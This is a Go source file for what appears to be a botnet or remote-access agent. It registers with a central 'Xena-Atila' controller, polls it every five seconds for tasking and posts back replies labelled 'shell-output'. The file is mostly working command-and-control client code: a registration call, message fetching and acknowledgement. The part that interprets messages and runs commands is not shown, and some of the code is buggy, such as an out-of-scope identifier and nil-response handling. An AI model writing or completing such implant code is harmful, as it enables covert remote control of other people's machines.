package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"time"
)

type Message struct {
	Id      string `json:"id"`      // Unique identifier.
	From    string `json:"from"`    // Node which originally issued the message.
	To      string `json:"to"`      // Which node should receive message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	Status  string `json:"status"`  // Message's state.
	ReplyTo string `json:"replyTo"` // Original message ID.
}

type ReplyMessage struct {
	From    string `json:"from"`    // Node which originally issued the message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	ReplyTo string `json:"replyTo"` // Message ID.
}

type MessageAck struct {
	Id     string `json:"id"`
	Status string `json:"status"`
}

var Messages = make(map[string]Message)

var XenaAtilas []string = []string{
	"http://localhost:60666",
}

/* Randomly pick one of the available Xena-Atila host. (seed is: time.Now().UnixNano()) */
func GetRandomXenaAtilaHost() string {
	rand.Seed(time.Now().UnixNano())
	return XenaAtilas[rand.Intn(len(XenaAtilas))]
}

/* Update the message' state. */
func messageAck(messageId string) {
	messageAck := MessageAck{
		Id:     messageId,
		Status: "SEEN",
	}

	messageAckJson, marshalErr := json.Marshal(messageAck)
	if marshalErr != nil {
		fmt.Println(marshalErr.Error())
	}

	request, err := http.NewRequest("POST", GetRandomXenaAtilaHost()+"/v1/messages/ack", bytes.NewBuffer(messageAckJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}

	defer response.Body.Close()
}

/* Respond to a message by a message. */
func issueMessageReply(content string, replyTo string) {
	replyMessage := ReplyMessage{
		Subject: "shell-output",
		From:    id.String(),
		Content: content,
		ReplyTo: replyTo,
	}

	insertionJson, marshalErr := json.Marshal(replyMessage)
	if marshalErr != nil {
		fmt.Println(marshalErr.Error())
	}

	request, err := http.NewRequest("POST", GetRandomXenaAtilaHost()+"/v1/messages", bytes.NewBuffer(insertionJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}
	response, err := client.Do(request)

	if err != nil {
		fmt.Println(err.Error())
	} else {
		messageAck(replyTo)
	}

	defer response.Body.Close()
}

/* Retrieves a new message. */
func fetchAndInterpretMessages(id string) {
	for range time.Tick(time.Second * 5) {
		response, err := http.Get(GetRandomXenaAtilaHost() + "/v1/messages?status=SENT&clientId=" + id)
		if err != nil {
			fmt.Println(err.Error())
		}

		jsonDecoder := json.NewDecoder(response.Body)
		jsonDecoder.DisallowUnknownFields()

		var messages []Message

		errJson := jsonDecoder.Decode(&messages)
		if errJson != nil {
			fmt.Println("Failed to parse the message.")
			fmt.Println(errJson.Error())
			continue
		}

		interpretMessages(messages)
	}
}

/* Makes Xena-Atila aware of its existence. */
func identify(id string, identificationKey string) {
	insertionJson := []byte(`{"id":"` + id + `","identificationKey":"` + identificationKey + `","status":"ALIVE"}`)

	request, err := http.NewRequest("POST", GetRandomXenaAtilaHost()+"/v1/clients", bytes.NewBuffer(insertionJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println("Unable to connect to the centralized host.")
	}

	client := &http.Client{}

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
	}

	defer response.Body.Close()
}
